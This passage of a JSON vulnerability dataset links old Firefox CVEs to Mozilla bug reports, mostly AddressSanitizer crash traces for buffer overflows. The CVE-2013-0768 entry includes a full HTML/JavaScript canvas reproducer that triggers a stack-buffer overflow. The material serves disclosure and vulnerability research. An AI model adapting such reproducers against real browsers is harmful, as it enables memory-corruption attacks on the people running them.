src/layout/generic/nsLineLayout.cpp:842 #10 0x7f3a02eee11c in nsInlineFrame::ReflowInlineFrame(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsIFrame*, unsigned int&) src/layout/generic/nsInlineFrame.cpp:694 #11 0x7f3a02eeb0d5 in nsInlineFrame::ReflowFrames(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsHTMLReflowMetrics&, unsigned int&) src/layout/generic/nsInlineFrame.cpp:557 #12 0x7f3a02ee7d25 in nsInlineFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsInlineFrame.cpp:409 #13 0x7f3a02f1d545 in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) src/layout/generic/nsLineLayout.cpp:842 #14 0x7f3a02bd4a61 in nsBlockFrame::ReflowInlineFrame(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsIFrame*, LineReflowStatus*) src/layout/generic/nsBlockFrame.cpp:3721 #15 0x7f3a02bcf0c5 in nsBlockFrame::DoReflowInlineFrames(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) src/layout/generic/nsBlockFrame.cpp:3518 #16 0x7f3a02bc1d19 in nsBlockFrame::ReflowInlineFrames(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:3372 #17 0x7f3a02bb102a in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:2479 #18 0x7f3a02b97e57 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) src/layout/generic/nsBlockFrame.cpp:1996 #19 0x7f3a02b8b143 in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsBlockFrame.cpp:1041 #20 0x7f3a02c777cc in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:952 #21 0x7f3a02e49e29 in nsCanvasFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsCanvasFrame.cpp:464 #22 0x7f3a02c777cc in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:952 #23 0x7f3a02dbfe28 in nsHTMLScrollFrame::ReflowScrolledFrame(ScrollReflowState*, bool, bool, nsHTMLReflowMetrics*, bool) src/layout/generic/nsGfxScrollFrame.cpp:433 #24 0x7f3a02dc4986 in nsHTMLScrollFrame::ReflowContents(ScrollReflowState*, nsHTMLReflowMetrics const&) src/layout/generic/nsGfxScrollFrame.cpp:533 #25 0x7f3a02dc9020 in nsHTMLScrollFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsGfxScrollFrame.cpp:774 #26 0x7f3a02c777cc in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:952 #27 0x7f3a031b7fea in ViewportFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsViewportFrame.cpp:202 #28 0x7f3a028eae9b in PresShell::DoReflow(nsIFrame*, bool) src/layout/base/nsPresShell.cpp:7532 #29 0x7f3a0291a94d in PresShell::ProcessReflowCommands(bool) src/layout/base/nsPresShell.cpp:7673 #30 0x7f3a0291949e in PresShell::FlushPendingNotifications(mozFlushType) src/layout/base/nsPresShell.cpp:3913 #31 0x7f3a029bfc15 in nsRefreshDriver::Notify(nsITimer*) src/layout/base/nsRefreshDriver.cpp:403 #32 0x7f3a0efeb393 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:485 #33 0x7f3a0efec731 in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:565 #34 0x7f3a0efaf3de in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:627 #35 0x7f3a0ec25a8f in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:221 #36 0x7f3a0d218776 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #37 0x7f3a0f2976ae in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:215 #38 0x7f3a0f2974f5 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:208 #39 0x7f3a0f2973db in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:182 #40 0x7f3a0c5f8a64 in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 #41 0x7f3a0b17fa32 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:290 #42 0x7f3a006b4e14 in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3822 #43 0x7f3a006baae9 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3889 #44 0x7f3a006bd860 in XRE_main src/toolkit/xre/nsAppRunner.cpp:4083 #45 0x40c1e6 in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:174 #46 0x409a20 in main src/browser/app/nsBrowserApp.cpp:279 #47 0x7f3a1fb9176c in ?? ??:0 0x7f39dafcdb51 is located 9 bytes to the right of 264-byte region [0x7f39dafcda40,0x7f39dafcdb48) allocated by thread T0 here: #0 0x4c3940 in malloc ??:? #1 0x7f3a20ba25f1 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:54 #2 0x7f3a096c7c31 in operator new(unsigned long) src/../../../../dist/include/mozilla/mozalloc.h:200 #3 0x7f3a090eb1cb in NS_NewSVGElement(nsIContent**, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) src/content/svg/content/src/nsSVGElementFactory.cpp:232 #4 0x7f3a04598d6c in NS_NewElement(nsIContent**, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) src/content/base/src/nsNameSpaceManager.cpp:212 #5 0x7f3a06232a6b in nsXMLContentSink::CreateElement(unsigned short const**, unsigned int, nsINodeInfo*, unsigned int, nsIContent**, bool*, mozilla::dom::FromParser) src/content/xml/document/src/nsXMLContentSink.cpp:467 #6 0x7f3a0623fff4 in nsXMLContentSink::HandleStartElement(unsigned short const*, unsigned short const**, unsigned int, int, unsigned int, bool) src/content/xml/document/src/nsXMLContentSink.cpp:997 #7 0x7f3a0623ec5e in nsXMLContentSink::HandleStartElement(unsigned short const*, unsigned short const**, unsigned int, int, unsigned int) src/content/xml/document/src/nsXMLContentSink.cpp:951 #8 0x7f3a06241b95 in non-virtual thunk to nsXMLContentSink::HandleStartElement(unsigned short const*, unsigned short const**, unsigned int, int, unsigned int) src/content/xml/document/src/nsXMLContentSink.cpp:953 Shadow byte and word: 0x1fe73b5f9b6a: fb 0x1fe73b5f9b68: 00 fb fb fb fb fb fb fb More shadow bytes: 0x1fe73b5f9b48: 00 00 00 00 00 00 00 00 0x1fe73b5f9b50: 00 00 00 00 00 00 00 00 0x1fe73b5f9b58: 00 00 00 00 00 00 00 00 0x1fe73b5f9b60: 00 00 00 00 00 00 00 00 =>0x1fe73b5f9b68: 00 fb fb fb fb fb fb fb 0x1fe73b5f9b70: fa fa fa fa fa fa fa fa 0x1fe73b5f9b78: fa fa fa fa fa fa fa fa 0x1fe73b5f9b80: fa fa fa fa fa fa fa fa 0x1fe73b5f9b88: 00 00 00 00 00 00 00 00 Stats: 253M malloced (239M for red zones) by 412251 calls Stats: 46M realloced by 24186 calls Stats: 224M freed by 284857 calls Stats: 189M really freed by 232799 calls Stats: 230M (59085 full pages) mmaped in 438 calls mmaps by size class: 7:147420; 8:45034; 9:13299; 10:5110; 11:6120; 12:1280; 13:960; 14:544; 15:224; 16:712; 17:456; 18:36; 19:35; 20:21; mallocs by size class: 7:267252; 8:86611; 9:23441; 10:8604; 11:16914; 12:2459; 13:1943; 14:1595; 15:413; 16:1542; 17:1345; 18:70; 19:40; 20:22; frees by size class: 7:182188; 8:57665; 9:17102; 10:5439; 11:14824; 12:1611; 13:1505; 14:1424; 15:281; 16:1375; 17:1329; 18:57; 19:38; 20:19; rfrees by size class: 7:155466; 8:44862; 9:10771; 10:3830; 11:11718; 12:1214; 13:1011; 14:1303; 15:216; 16:1017; 17:1295; 18:50; 19:37; 20:9; Stats: malloc large: 3432 small slow: 5044 ==17302== ABORTING"
      }
    ],
    "CVE-2013-0768": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=815795",
        "title": "stack buffer overflow with canvas",
        "description": "<html> <head> <script> setTimeout(\"location.reload()\", 1000) el18=document.createElement('canvas') ctx=el18.getContext('2d') ctx.shadowColor = 'black' ctx.shadowBlur = 8 ctx.globalAlpha=0 ctx.miterLimit=0 ctx.strokeStyle=ctx.createLinearGradient(0, 0, 0, 0) ctx.beginPath() ctx.arc(50, 80, 125, 0.1, -1, false) ctx.scale(0.0055, 1) document.implementation.createDocument('' ,'' ,null).adoptNode(el18) var imgxz= new Image() imgxz.src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==' ctx.fillStyle=ctx.createPattern(imgxz,'') ctx.fill('', 0, 0) </script> </head> <body> </body> </html> results in: ==3262== ERROR: AddressSanitizer stack-buffer-overflow on address 0x7fffffff2c9c at pc 0x7ffff0388727 bp 0x7fffffff2990 sp 0x7fffffff2988 READ of size 4 at 0x7fffffff2c9c thread T0 #0 0x7ffff0388726 in fast_composite_scaled_bilinear_sse2_8888_8_8888_normal_OVER /builds/slave/try-lnx64/build/gfx/cairo/libpixman/src/pixman-sse2.c:5725 #1 0x7ffff02d8d97 in _moz_pixman_image_composite32 /builds/slave/try-lnx64/build/gfx/cairo/libpixman/src/pixman.c:712 #2 0x7ffff026227e in _composite_spans /builds/slave/try-lnx64/build/gfx/cairo/cairo/src/cairo-image-surface.c:3496 Address 0x7fffffff2c9c is located at offset 220 in frame <fast_composite_scaled_bilinear_sse2_8888_8_8888_normal_OVER> of T0's stack: This frame has 5 object(s): [32, 44) 'v' [96, 104) 'buf1' [160, 168) 'buf2' [224, 736) 'extended_src_line0' [768, 1280) 'extended_src_line1'"
      }
    ],
    "CVE-2013-0771": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=785555",
        "title": "Heap-buffer-overflow in gfxTextRun::ShrinkToLigatureBoundaries",
        "description": "Reproduces on trunk ================================================================= ==12169== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f45e076bf00 at pc 0x7f45ff1828e9 bp 0x7fff4b935330 sp 0x7fff4b935328 READ of size 4 at 0x7f45e076bf00 thread T0 #0 0x7f45ff1828e8 in gfxShapedWord::CompressedGlyph::IsLigatureGroupStart() const src/../../dist/include/gfxFont.h:1897 #1 0x7f460a041636 in gfxTextRun::ShrinkToLigatureBoundaries(unsigned int*, unsigned int*) src/gfx/thebes/gfxFont.cpp:4555 #2 0x7f460a04d863 in gfxTextRun::BreakAndMeasureText(unsigned int, unsigned int, bool, double, gfxTextRun::PropertyProvider*, bool, double*, gfxFont::RunMetrics*, gfxFont::BoundingBoxType, gfxContext*, bool*, unsigned int*, bool, gfxBreakPriority*) src/gfx/thebes/gfxFont.cpp:4946 #3 0x7f45ff148515 in nsTextFrame::ReflowText(nsLineLayout&, int, nsRenderingContext*, bool, nsHTMLReflowMetrics&, unsigned int&) src/layout/generic/nsTextFrameThebes.cpp:7785 #4 0x7f45fef550cd in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) src/layout/generic/nsLineLayout.cpp:829 #5 0x7f45fef25f3b in nsInlineFrame::ReflowInlineFrame(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsIFrame*, unsigned int&) src/layout/generic/nsInlineFrame.cpp:680 #6 0x7f45fef22b75 in nsInlineFrame::ReflowFrames(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsHTMLReflowMetrics&, unsigned int&) src/layout/generic/nsInlineFrame.cpp:543 #7 0x7f45fef1fbdf in nsInlineFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsInlineFrame.cpp:397 #8 0x7f45fef54c93 in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) src/layout/generic/nsLineLayout.cpp:822 #9 0x7f45fef25f3b in nsInlineFrame::ReflowInlineFrame(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsIFrame*, unsigned int&) src/layout/generic/nsInlineFrame.cpp:680 #10 0x7f45fef22b75 in nsInlineFrame::ReflowFrames(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsHTMLReflowMetrics&, unsigned int&) src/layout/generic/nsInlineFrame.cpp:543 #11 0x7f45fef1fbdf in nsInlineFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsInlineFrame.cpp:397 #12 0x7f45fef54c93 in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) src/layout/generic/nsLineLayout.cpp:822 #13 0x7f45fef25f3b in nsInlineFrame::ReflowInlineFrame(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsIFrame*, unsigned int&) src/layout/generic/nsInlineFrame.cpp:680 #14 0x7f45fef22b75 in nsInlineFrame::ReflowFrames(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsHTMLReflowMetrics&, unsigned int&) src/layout/generic/nsInlineFrame.cpp:543 #15 0x7f45fef1fbdf in nsInlineFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsInlineFrame.cpp:397 #16 0x7f45fef54c93 in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) src/layout/generic/nsLineLayout.cpp:822 #17 0x7f45fec12318 in nsBlockFrame::ReflowInlineFrame(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsIFrame*, LineReflowStatus*) src/layout/generic/nsBlockFrame.cpp:3835 #18 0x7f45fec0c421 in nsBlockFrame::DoReflowInlineFrames(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) src/layout/generic/nsBlockFrame.cpp:3631 #19 0x7f45febff041 in nsBlockFrame::ReflowInlineFrames(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:3483 #20 0x7f45febedecb in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:2571 #21 0x7f45febd4579 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) src/layout/generic/nsBlockFrame.cpp:2021 #22 0x7f45febc7557 in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsBlockFrame.cpp:1070 #23 0x7f45fec55b20 in nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) src/layout/generic/nsBlockReflowContext.cpp:268 #24 0x7f45febf8cfd in nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:3207 #25 0x7f45febed996 in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) src/layout/generic/nsBlockFrame.cpp:2515 #26 0x7f45febd4579 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) src/layout/generic/nsBlockFrame.cpp:2021 #27 0x7f45febc7557 in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsBlockFrame.cpp:1070 #28 0x7f45fecb5398 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:946 #29 0x7f45fee86485 in nsCanvasFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsCanvasFrame.cpp:463 #30 0x7f45fecb5398 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:946 #31 0x7f45fedfcec9 in nsHTMLScrollFrame::ReflowScrolledFrame(ScrollReflowState*, bool, bool, nsHTMLReflowMetrics*, bool) src/layout/generic/nsGfxScrollFrame.cpp:523 #32 0x7f45fee01e9e in nsHTMLScrollFrame::ReflowContents(ScrollReflowState*, nsHTMLReflowMetrics const&) src/layout/generic/nsGfxScrollFrame.cpp:623 #33 0x7f45fee0630a in nsHTMLScrollFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsGfxScrollFrame.cpp:864 #34 0x7f45fecb5398 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) src/layout/generic/nsContainerFrame.cpp:946 #35 0x7f45ff1deb8d in ViewportFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsViewportFrame.cpp:200 #36 0x7f45fe9439fc in PresShell::DoReflow(nsIFrame*, bool) src/layout/base/nsPresShell.cpp:7430 #37 0x7f45fe97036b in PresShell::ProcessReflowCommands(bool) src/layout/base/nsPresShell.cpp:7577 #38 0x7f45fe96ebf1 in PresShell::FlushPendingNotifications(mozFlushType) src/layout/base/nsPresShell.cpp:3898 #39 0x7f45fea109f1 in nsRefreshDriver::Notify(nsITimer*) src/layout/base/nsRefreshDriver.cpp:398 #40 0x7f4609a629c6 in nsTimerImpl::Fire() src/xpcom/threads/nsTimerImpl.cpp:476 #41 0x7f4609a641b8 in nsTimerEvent::Run() src/xpcom/threads/nsTimerImpl.cpp:556 #42 0x7f4609a275ae in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:624 #43 0x7f46096c89c7 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #44 0x7f4608605275 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #45 0x7f4609cd4279 in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:208 #46 0x7f4609cd40c2 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:201 #47 0x7f4609cd3fa7 in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:175 #48 0x7f4607acfa0e in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 #49 0x7f4606740528 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:273 #50 0x7f45fcf4c350 in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3800 #51 0x7f45fcf525c4 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3877 #52 0x7f45fcf5568e in XRE_main src/toolkit/xre/nsAppRunner.cpp:3953 #53 0x40c5bb in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:174 #54 0x409e1f in main src/browser/app/nsBrowserApp.cpp:279 #55 0x7f4619e1ec4d in ?? ??:0 0x7f45e076bf00 is located 4 bytes to the right of 124-byte region [0x7f45e076be80,0x7f45e076befc) allocated by thread T0 here: #0 0x4c3e40 in __interceptor_malloc ??:0 #1 0x7f4616cbc9d2 in moz_malloc src/memory/mozalloc/mozalloc.cpp:67 #2 0x7f460a038f43 in gfxTextRun::AllocateStorageForTextRun(unsigned long, unsigned int) src/gfx/thebes/gfxFont.cpp:4302 #3 0x7f460a01c06b in gfxTextRun::Create(gfxTextRunFactory::Parameters const*, unsigned int, gfxFontGroup*, unsigned int) src/gfx/thebes/gfxFont.cpp:4319 #4 0x7f460a01c720 in gfxFontGroup::MakeSpaceTextRun(gfxTextRunFactory::Parameters const*, unsigned int) src/gfx/thebes/gfxFont.cpp:3311 #5 0x7f460a01f534 in gfxFontGroup::MakeTextRun(unsigned char const*, unsigned int, gfxTextRunFactory::Parameters const*, unsigned int) src/gfx/thebes/gfxFont.cpp:3355 #6 0x7f45ff0b4128 in gfxTextRun* MakeTextRun<unsigned char>(unsigned char const*, unsigned int, gfxFontGroup*, gfxTextRunFactory::Parameters const*, unsigned int) src/layout/generic/nsTextFrameThebes.cpp:549 #7 0x7f45ff0a82fa in BuildTextRunsScanner::BuildTextRunForFrames(void*) src/layout/generic/nsTextFrameThebes.cpp:2025 #8 0x7f45ff09de6b in BuildTextRunsScanner::FlushFrames(bool, bool) src/layout/generic/nsTextFrameThebes.cpp:1388 #9 0x7f45ff0ada39 in BuildTextRunsScanner::ScanFrame(nsIFrame*) src/layout/generic/nsTextFrameThebes.cpp:1578 #10 0x7f45ff0ae326 in BuildTextRunsScanner::ScanFrame(nsIFrame*) src/layout/generic/nsTextFrameThebes.cpp:1618 #11 0x7f45ff0ae326 in BuildTextRunsScanner::ScanFrame(nsIFrame*) src/layout/generic/nsTextFrameThebes.cpp:1618 #12 0x7f45ff0ae326 in BuildTextRunsScanner::ScanFrame(nsIFrame*) src/layout/generic/nsTextFrameThebes.cpp:1618 #13 0x7f45ff0c17eb in BuildTextRuns(gfxContext*, nsTextFrame*, nsIFrame*, nsLineList_iterator const*, nsTextFrame::TextRunType) src/layout/generic/nsTextFrameThebes.cpp:1291 #14 0x7f45ff0bd322 in nsTextFrame::EnsureTextRun(nsTextFrame::TextRunType, gfxContext*, nsIFrame*, nsLineList_iterator const*, unsigned int*) src/layout/generic/nsTextFrameThebes.cpp:2441 #15 0x7f45ff146c51 in nsTextFrame::ReflowText(nsLineLayout&, int, nsRenderingContext*, bool, nsHTMLReflowMetrics&, unsigned int&) src/layout/generic/nsTextFrameThebes.cpp:7705 #16 0x7f45fef550cd in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) src/layout/generic/nsLineLayout.cpp:829 #17 0x7f45fef25f3b in nsInlineFrame::ReflowInlineFrame(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsIFrame*, unsigned int&) src/layout/generic/nsInlineFrame.cpp:680 #18 0x7f45fef22b75 in nsInlineFrame::ReflowFrames(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsHTMLReflowMetrics&, unsigned int&) src/layout/generic/nsInlineFrame.cpp:543 #19 0x7f45fef1fbdf in nsInlineFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsInlineFrame.cpp:397 #20 0x7f45fef54c93 in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) src/layout/generic/nsLineLayout.cpp:822 #21 0x7f45fef25f3b in nsInlineFrame::ReflowInlineFrame(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsIFrame*, unsigned int&) src/layout/generic/nsInlineFrame.cpp:680 #22 0x7f45fef22b75 in nsInlineFrame::ReflowFrames(nsPresContext*, nsHTMLReflowState const&, nsInlineFrame::InlineReflowState&, nsHTMLReflowMetrics&, unsigned int&) src/layout/generic/nsInlineFrame.cpp:543 #23 0x7f45fef1fbdf in nsInlineFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/generic/nsInlineFrame.cpp:397 #24 0x7f45fef54c94 in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) src/layout/generic/nsLineLayout.cpp:822 Shadow byte and word: 0x1fe8bc0ed7e0: fa 0x1fe8bc0ed7e0: fa fa fa fa fa fa fa fa More shadow bytes: 0x1fe8bc0ed7c0: fa fa fa fa fa fa fa fa 0x1fe8bc0ed7c8: fa fa fa fa fa fa fa fa 0x1fe8bc0ed7d0: 00 00 00 00 00 00 00 00 0x1fe8bc0ed7d8: 00 00 00 00 00 00 00 04 =>0x1fe8bc0ed7e0: fa fa fa fa fa fa fa fa 0x1fe8bc0ed7e8: fa fa fa fa fa fa fa fa 0x1fe8bc0ed7f0: 00 00 03 fb fb fb fb fb 0x1fe8bc0ed7f8: fb fb fb fb fb fb fb fb 0x1fe8bc0ed800: fa fa fa fa fa fa fa fa Stats: 225M malloced (237M for red zones) by 356222 calls Stats: 41M realloced by 20031 calls Stats: 195M freed by 233151 calls Stats: 61M really freed by 153616 calls Stats: 428M (109644 full pages) mmaped in 107 calls mmaps by size class: 8:245745; 9:40955; 10:16380; 11:14329; 12:2048; 13:1536; 14:1280; 15:256; 16:448; 17:1248; 18:144; 19:40; 20:16; mallocs by size class: 8:270186; 9:45811; 10:15863; 11:16411; 12:2410; 13:1791; 14:1427; 15:303; 16:504; 17:1289; 18:170; 19:41; 20:16; frees by size class: 8:163811; 9:36853; 10:12738; 11:13321; 12:1546; 13:1490; 14:1240; 15:259; 16:449; 17:1277; 18:115; 19:39; 20:13; rfrees by size class: 8:115976; 9:19137; 10:7708; 11:8747; 12:536; 13:469; 14:336; 15:146; 16:338; 17:189; 18:28; 19:5; 20:1; Stats: malloc large: 1516 small slow: 1815 ==12169== ABORTING"
      }
    ],
    "CVE-2013-0772": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=801366",
        "title": "out-of-bounds-read in mozilla::image::RasterImage::DrawFrameTo",
        "description": "The ASAN-report from this bug looks almost identical to https://bugzilla.mozilla.org/show_bug.cgi?id=758200 which should be fixed. I also tried the repro-files from the earlier bug but those don't cause crash anymore. Tested with build from https://people.mozilla.com/~choller/firefox/asan/20121013-mozilla-central-linux64-debug-0be7bfea4744+asan.html To reproduce open the attached gif-image with ASAN built Firefox didn't affect Firefox 16.0.1 official-build. ASAN-report: ==11528== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f43552f8bbc at pc 0x7f4375acb440 bp 0x7fffc641a070 sp 0x7fffc641a068 READ of size 4 at 0x7f43552f8bbc thread T0 #0 0x7f4375acb43f in mozilla::image::RasterImage::DrawFrameTo(imgFrame*, imgFrame*, nsIntRect&) /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:2173 #1 0x7f4375ac0fa7 in mozilla::image::RasterImage::DoComposite(nsIntRect*, imgFrame*, imgFrame*, int) /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:1979 #2 0x7f4375abfcc4 in mozilla::image::RasterImage::AdvanceFrame(mozilla::TimeStamp, nsIntRect*) /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:442 #3 0x7f4375ac166b in mozilla::image::RasterImage::RequestRefresh(mozilla::TimeStamp const&) /builds/slave/try-lnx64-dbg/build/image/src/RasterImage.cpp:485 #4 0x7f4375ce774c in nsRefreshDriver::ImageRequestEnumerator(nsISupportsHashKey*, void*) /builds/slave/try-lnx64-dbg/build/layout/base/nsRefreshDriver.cpp:469 #5 0x7f4377f204a3 in PL_DHashTableEnumerate /builds/slave/try-lnx64-dbg/build/obj-firefox/xpcom/build/pldhash.cpp:716 #6 0x7f4375ce756c in nsTHashtable<nsISupportsHashKey>::EnumerateEntries(PLDHashOperator (*)(nsISupportsHashKey*, void*), void*) /builds/slave/try-lnx64-dbg/build/../../dist/include/nsTHashtable.h:237 #7 0x7f4375ce622f in nsRefreshDriver::Notify(nsITimer*) /builds/slave/try-lnx64-dbg/build/layout/base/nsRefreshDriver.cpp:417 #8 0x7f4377fd97e7 in nsTimerImpl::Fire() /builds/slave/try-lnx64-dbg/build/xpcom/threads/nsTimerImpl.cpp:475 #9 0x7f4377fda1ae in nsTimerEvent::Run() /builds/slave/try-lnx64-dbg/build/xpcom/threads/nsTimerImpl.cpp:555 #10 0x7f4377fcd22b in nsThread::ProcessNextEvent(bool, bool*) /builds/slave/try-lnx64-dbg/build/xpcom/threads/nsThread.cpp:612 #11 0x7f4377f1ba12 in NS_ProcessNextEvent_P(nsIThread*, bool) /builds/slave/try-lnx64-dbg/build/obj-firefox/xpcom/build/nsThreadUtils.cpp:220 #12 0x7f4377b6442b in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/slave/try-lnx64-dbg/build/ipc/glue/MessagePump.cpp:82 #13 0x7f437805a851 in MessageLoop::RunInternal() 